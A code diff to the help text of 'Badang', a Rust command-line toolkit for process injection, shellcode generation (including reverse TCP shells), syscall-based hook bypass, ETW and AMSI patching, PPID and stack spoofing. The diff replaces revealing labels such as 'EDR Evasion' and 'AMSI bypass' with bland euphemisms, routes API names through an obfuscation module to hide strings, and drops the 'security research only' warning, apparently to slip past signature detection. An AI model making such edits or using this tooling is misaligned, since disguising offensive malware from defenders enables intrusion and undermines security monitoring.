@@ -48,7 +48,7 @@ impl CLI {
             confirm: false,
             target_pid: 0,
             inject_technique: String::from("createremote"),
-            payload: String::from("shellcode.bin"),
+            payload: String::from("payload.bin"),
             syscall_func: crate::obf::s(crate::obf::NT_ALLOC_VM),
             unhook_func: crate::obf::s(crate::obf::NT_CREATE_THREAD),
             convert_input: String::new(),
@@ -291,35 +291,35 @@ impl CLI {
 }
 
 fn print_help() {
-    println!("Badang v0.2.0 — EDR Evasion Research Toolkit");
+    println!("Badang v0.2.0");
     println!();
     println!("USAGE: badang <command> [options]");
     println!();
     println!("COMMANDS:");
-    println!("  analyze    Analyze hooked APIs in a target process");
-    println!("  syscall    Direct/indirect syscall invocation (bypass user-mode hooks)");
-    println!("  inject     Process injection technique demonstration");
-    println!("  load       Load and verify a shellcode payload file (no execution)");
-    println!("  convert    Convert shellcode between formats (hex/C/Python/Rust/decimal)");
-    println!("  generate   Generate shellcode payload (built-in, no msfvenom needed)");
+    println!("  analyze    Analyze target process APIs");
+    println!("  syscall    Direct/indirect syscall invocation");
+    println!("  inject     Process technique module");
+    println!("  load       Load and verify a payload file (no execution)");
+    println!("  convert    Convert payload between formats (hex/C/Python/Rust/decimal)");
+    println!("  generate   Generate payload (built-in)");
     println!("  scan       List running processes (pick a target PID)");
-    println!("  unhook     API unhooking (restore original function bytes)");
-    println!("  etw        ETW patching (blind EDR telemetry by patching EtwEventWrite)");
-    println!("  amsi       AMSI bypass (patch AmsiScanBuffer to skip scans)");
-    println!("  encrypt    Encrypt shellcode with XOR/RC4 (adds decryption stub)");
-    println!("  ppid       PPID spoofing (spawn process with fake parent)");
-    println!("  sleep      Sleep obfuscation (encrypt memory during sleep)");
-    println!("  spoof      Stack spoofing (fake call stack frames)");
+    println!("  unhook     Restore original function bytes");
+    println!("  etw        Telemetry management module");
+    println!("  amsi       Memory scan management module");
+    println!("  encrypt    Encrypt payload with XOR/RC4 (adds decryption stub)");
+    println!("  ppid       Parent attribute management");
+    println!("  sleep      Memory protection during sleep");
+    println!("  spoof      Call stack management");
     println!();
     println!("OPTIONS:");
     println!("  -p, --pid <PID>       Target process ID (required)");
-    println!("  -s, --syscall <FUNC>  Target syscall function (syscall command)");
+    println!("  -s, --syscall <FUNC>  Target syscall function");
     println!("  -f, --func <FUNC>     Target function name (alias for --syscall)");
-    println!("  -t, --technique <TEC> Injection technique (inject command)");
-    println!("  -l, --payload <PATH>  Shellcode payload file (load command, live inject)");
-    println!("  -u, --unhook <FUNC>   Target API to unhook (unhook command)");
-    println!("  -i, --input <TEXT>    Shellcode bytes to convert (convert command)");
-    println!("  -o, --output <PATH>   Output .bin file (convert command, default: payload.bin)");
+    println!("  -t, --technique <TEC> Technique selection");
+    println!("  -l, --payload <PATH>  Payload file path");
+    println!("  -u, --unhook <FUNC>   Target API to restore");
+    println!("  -i, --input <TEXT>    Bytes to convert");
+    println!("  -o, --output <PATH>   Output .bin file (default: payload.bin)");
     println!(
         "      --format <FMT>    Input format: auto/hex/c/python/rust/decimal (default: auto)"
     );
@@ -341,7 +341,7 @@ fn print_help() {
     println!("GENERATE EXAMPLES:");
     println!("  badang-cli generate --type exec --command \"calc.exe\" -o payload.bin");
     println!(
-        "  badang-cli generate --type messagebox --title \"Pwned\" --text \"Hello\" -o msg.bin"
+        "  badang-cli generate --type messagebox --title \"Test\" --text \"Hello\" -o msg.bin"
     );
     println!(
         "  badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.bin"
@@ -355,13 +355,13 @@ fn print_help() {
     println!("  badang-cli convert --payload input.bin --format hex    (dump a .bin as hex)");
     println!();
     println!("ETW EXAMPLES:");
-    println!("  badang-cli etw -x -c                                    (patch EtwEventWrite)");
-    println!("  badang-cli etw --patch EtwEventWriteFull -x -c          (patch EtwEventWriteFull)");
-    println!("  badang-cli etw --patch NtTraceEvent -x -c               (patch NtTraceEvent)");
+    println!("  badang-cli etw -x -c");
+    println!("  badang-cli etw --patch {} -x -c", crate::obf::s(crate::obf::ETW_EVENT_WRITE_FULL));
+    println!("  badang-cli etw --patch {} -x -c", crate::obf::s(crate::obf::NT_TRACE_EVENT));
     println!();
     println!("AMSI EXAMPLES:");
-    println!("  badang-cli amsi -x -c                                   (patch AmsiScanBuffer)");
-    println!("  badang-cli amsi --patch AmsiScanString -x -c            (patch AmsiScanString)");
+    println!("  badang-cli amsi -x -c");
+    println!("  badang-cli amsi --patch {} -x -c", crate::obf::s(crate::obf::AMSI_SCAN_STRING));
     println!();
     println!("ENCRYPT OPTIONS:");
     println!("  --method <METHOD>     Encryption method: xor, xormulti, rc4 (default: xor)");
@@ -376,37 +376,36 @@ fn print_help() {
     );
     println!();
     println!("SYSCALL OPTIONS:");
-    println!("  --indirect            Use indirect syscall (Hell's Gate / Halo's Gate)");
+    println!("  --indirect            Use indirect syscall resolution");
     println!();
     println!("SYSCALL EXAMPLES:");
-    println!("  badang-cli syscall --syscall NtAllocateVirtualMemory -x -c");
-    println!("  badang-cli syscall --syscall NtCreateThreadEx --indirect -x -c");
+    println!("  badang-cli syscall --syscall {} -x -c", crate::obf::s(crate::obf::NT_ALLOC_VM));
+    println!("  badang-cli syscall --syscall {} --indirect -x -c", crate::obf::s(crate::obf::NT_CREATE_THREAD));
     println!();
     println!("PPID OPTIONS:");
     println!("  --parent <NAME>       Parent process name (e.g., explorer.exe)");
     println!("  --parent-pid <PID>    Parent process PID (alternative to --parent)");
     println!("  --child <CMD>         Child command to spawn (default: notepad.exe)");
-    println!("  --suspended           Create child suspended (for APC injection)");
+    println!("  --suspended           Create child suspended");
     println!();
     println!("PPID EXAMPLES:");
     println!("  badang-cli ppid --parent explorer.exe --child notepad.exe -x -c");
     println!("  badang-cli ppid --parent-pid 1234 --child cmd.exe --suspended -x -c");
     println!();
     println!("SLEEP OPTIONS:");
-    println!("  --method <METHOD>     Sleep method: manual, ekko (default: manual)");
-    println!("  --duration <MS>       Sleep duration in ms (default: 3000)");
+    println!("  --method <METHOD>     Method: manual, ekko (default: manual)");
+    println!("  --duration <MS>       Duration in ms (default: 3000)");
     println!();
     println!("SLEEP EXAMPLES:");
     println!("  badang-cli sleep --method manual --duration 5000 -x -c");
     println!("  badang-cli sleep --method ekko --duration 3000 -x -c");
     println!();
     println!("SPOOF OPTIONS:");
-    println!("  --demo <FUNC>         Target function for stack spoof demo");
+    println!("  --demo <FUNC>         Target function for demo");
     println!();
     println!("SPOOF EXAMPLES:");
-    println!("  badang-cli spoof --demo NtAllocateVirtualMemory -x -c");
-    println!("  badang-cli spoof --demo NtCreateThreadEx -x -c");
+    println!("  badang-cli spoof --demo {} -x -c", crate::obf::s(crate::obf::NT_ALLOC_VM));
+    println!("  badang-cli spoof --demo {} -x -c", crate::obf::s(crate::obf::NT_CREATE_THREAD));
     println!();
-    println!("WARNING: For authorized security research only.");
-    println!("Using without authorization is illegal.");
+    println!("WARNING: For authorized use only.");
 }
